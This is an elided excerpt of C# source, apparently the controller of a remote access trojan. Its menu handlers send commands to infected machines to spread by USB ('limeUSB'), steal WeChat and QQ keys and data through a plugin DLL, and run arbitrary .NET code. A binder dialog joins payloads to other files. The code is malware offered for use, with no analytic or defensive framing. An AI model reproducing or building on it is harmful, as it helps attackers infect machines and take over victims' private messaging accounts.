...
namespace Server
{
    ...
    public partial class Form1 : Form
    {
        ...
        {
            using (FormBinder formBinder = new FormBinder())
            {
                formBinder.ShowDialog();
            }
        }
        ...
        private void uSB感染ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "limeUSB";
        ...
        private void uSBSpreadUSB排列ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
        ...
        private void 微信取证最高支持38126ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "wechat";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        ...
        private void qQ取证ToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "QQkey";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
        ...
        private void executeNETCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
